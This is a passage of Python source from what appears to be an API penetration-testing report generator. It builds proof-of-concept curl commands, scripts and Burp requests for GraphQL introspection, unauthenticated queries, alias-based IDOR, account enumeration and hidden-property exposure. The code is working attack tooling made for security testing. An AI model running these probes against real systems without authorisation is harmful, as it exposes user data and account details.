# Test 1: Introspection (schema leakage)
introspection = {{"query": "{{ __schema {{ types {{ name fields {{ name }} }} }} }}"}}
r1 = session.post(TARGET, json=introspection, headers={{"Content-Type": "application/json"}})
print(f"[INTROSPECTION] Status: {{r1.status_code}}")
if "__schema" in r1.text:
    print("[!!!] INTROSPECTION ENABLED — full schema exposed")
    import json as _j
    schema = _j.loads(r1.text)
    types = [t["name"] for t in schema.get("data", {{}}).get("__schema", {{}}).get("types", [])
             if not t["name"].startswith("__")]
    print(f"[*] Found {{len(types)}} types: {{types[:10]}}")

# Test 2: Unauthenticated query
for query in [
    {{"query": "{{ users {{ id email }} }}"}},
    {{"query": "{{ me {{ id email role }} }}"}},
    {{"query": "{{ orders {{ id total status }} }}"}},
]:
    r2 = session.post(TARGET, json=query)  # No auth header
    print(f"\\n[UNAUTH QUERY] {{query['query'][:40]}}")
    print(f"Status: {{r2.status_code}}, Has errors: {{'errors' in r2.text}}")
    if r2.status_code == 200 and "errors" not in r2.text and "data" in r2.text:
        print("[!!!] UNAUTHENTICATED DATA ACCESS CONFIRMED")
        print(f"Data: {{r2.text[:300]}}")
        break
'''

        steps = [
            f"1. Send the introspection query to {url} and check if schema is returned",
            "2. From the schema, identify sensitive types (User, Payment, Order, Admin)",
            "3. Craft queries for sensitive data without an auth token",
            "4. Test batching: send multiple queries in one request to bypass rate limits",
            "5. Test alias-based IDOR: `{{ a: user(id:1) {{ email }} b: user(id:2) {{ email }} }}`",
        ]

        idor_query = json.dumps({"query": "{ a: user(id: 1) { email role } b: user(id: 2) { email role } }"})
        return ProofOfConcept(
            summary="GraphQL introspection enabled and/or unauthenticated queries return sensitive data",
            curl_command=(
                f"# Introspection test:\n"
                f'curl -sk -X POST "{url}" \\\n'
                f'  -H "Content-Type: application/json" \\\n'
                f"  -d '{{\"query\": \"{{ __schema {{ types {{ name }} }} }}\"}}'\n\n"
                f"# IDOR via alias:\n"
                f'curl -sk -X POST "{url}" \\\n'
                f'  -H "Authorization: Bearer {token}" \\\n'
                f"  -H \"Content-Type: application/json\" \\\n"
                f"  -d '{idor_query}'"
            ),
            python_script=python,
            burp_request=(
                f"POST {urlparse(url).path} HTTP/1.1\n"
                f"Host: {urlparse(url).netloc}\n"
                f"Content-Type: application/json\n\n"
                f'{{\"query\": \"{{ __schema {{ types {{ name }} }} }}\"}}'
            ),
            expected_result="Introspection returns the full API schema. Unauthenticated queries return user/order/payment data.",
            steps=steps,
            video_note="Show the introspection response with full schema, then show sensitive data returned without authentication.",
        )

    def _poc_enumeration(self, f: Finding) -> ProofOfConcept:
        url = f.request.get("url", "")
        method = f.request.get("method", "POST")
        body = f.request.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# Account Enumeration PoC
import time

TARGET = "{url}"
HEADERS = {{"Content-Type": "application/json"}}

test_accounts = [
    ("nonexistent_xyz_9999@example.com", "non-existent"),
    ("admin@example.com", "common target"),
    ("test@test.com", "common test"),
]

field = next((k for k in {json.dumps(body)}.keys() if k in ("email", "username", "user", "login")), "email")

print("[*] Testing for account enumeration...")
for email, label in test_accounts:
    body = {json.dumps(body)}
    body[field] = email
    start = time.time()
    r = requests.post(TARGET, json=body, headers=HEADERS, verify=False)
    elapsed = time.time() - start
    print(f"  [{{label}}] Status={{r.status_code}} Time={{elapsed:.3f}}s Message={{r.text[:100]}}")

print("\\n[*] Look for:")
print("  1. Different error messages between existing and non-existing accounts")
print("  2. Timing differences > 150ms (indicates different code paths)")
print("  3. HTTP status code differences")
'''

        steps = [
            f"1. Send a login/reset request with a known-valid email to {url}",
            "2. Note the exact error message and response time",
            "3. Repeat with a clearly invalid email (random string)",
            "4. Compare: different messages ('wrong password' vs 'account not found') = enumerable",
            "5. Compare: response time difference > 150ms = timing oracle",
        ]

        return ProofOfConcept(
            summary="Valid accounts can be identified via different error messages or response timing",
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result="Different error messages or response times for valid vs invalid accounts allow enumeration of the user base.",
            steps=steps,
            video_note="Show two requests side by side with different emails. Highlight the different error messages in the responses.",
        )

    def _poc_bopla(self, f: Finding) -> ProofOfConcept:
        url = f.request.get("url", "")
        params = f.request.get("params", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# BOPLA — Object Property Exposure PoC
TARGET = "{url}"
HEADERS = {{"Authorization": "Bearer {token}", "Content-Type": "application/json"}}

# Baseline
r1 = session.get(TARGET, headers=HEADERS)
print(f"[BASELINE] Fields: {{list(__import__('json').loads(r1.text).keys()) if r1.text.startswith(chr(123)) else r1.text[:100]}}")

# Test expand parameters
for probe in [
    {{"expand": "all"}}, {{"fields": "*"}}, {{"include": "all"}},
    {{"verbose": "1"}}, {{"full": "true"}}, {{"show_private": "1"}},
]:
    r2 = session.get(TARGET, params=probe, headers=HEADERS)
    if len(r2.text) > len(r1.text) * 1.1:
        try:
            d1 = __import__("json").loads(r1.text)
            d2 = __import__("json").loads(r2.text)
            new_keys = set(d2.keys()) - set(d1.keys()) if isinstance(d1, dict) and isinstance(d2, dict) else set()
            print(f"\\n[BOPLA] Param={{probe}} returned {{len(r2.text) - len(r1.text)}} extra bytes")
            print(f"[BOPLA] New fields: {{list(new_keys)[:10]}}")
            print("[!!!] BOPLA CONFIRMED — extra fields exposed via request parameter")
        except Exception:
            print(f"[BOPLA] Param={{probe}} → response size: {{len(r1.text)}} → {{len(r2.text)}}")
'''

        steps = [
            f"1. Send a normal GET request to {url} and note the response fields",
            "2. Add `?expand=all` to the URL and compare the response",
            "3. Try `?fields=*`, `?include=all`, `?verbose=1`, `?full=true`",
            "4. Check if new fields appear (especially: password_hash, internal_notes, admin_flags, SSN)",
            "5. If sensitive fields appear, document the exact parameter that triggered them",
        ]

        return ProofOfConcept(
            summary="Hidden object properties exposed by adding expand/include parameters to the request",
            curl_command=f'curl -sk "{url}?expand=all" \\\n  -H "Authorization: Bearer {token}"',
            python_script=python,
            burp_request=self._burp_request("GET", url + "?expand=all"),
            expected_result="Response contains additional fields not present in the baseline response. Sensitive fields (e.g. internal notes, admin flags, hashed credentials) may be exposed.",
            steps=steps,
            video_note="Show the normal response, then the expanded response with new fields highlighted.",
        )

    def _poc_generic(self, f: Finding) -> ProofOfConcept:
        req = f.request
        url = req.get("url", "")
        method = req.get("method", "GET")
        body = req.get("body", {})
        token = self.config.auth_token

        python = self._python_script_header() + f'''
# Generic PoC — {f.title}
TARGET = "{url}"
HEADERS = {{
    "Authorization": "Bearer {token}",
    "Content-Type": "application/json",
}}
BODY = {json.dumps(body, indent=4)}

r = session.request("{method}", TARGET, json=BODY or None, headers=HEADERS)
print(f"Status: {{r.status_code}}")
print(f"Response: {{r.text[:500]}}")
'''

        return ProofOfConcept(
            summary=f.title,
            curl_command=self._curl_base(method, url, body),
            python_script=python,
            burp_request=self._burp_request(method, url, body),
            expected_result=f.evidence,
            steps=[
                f"1. Send the request shown in the curl command",
                f"2. Observe: {f.evidence}",
                f"3. Compare to a normal baseline request",
            ],
        )
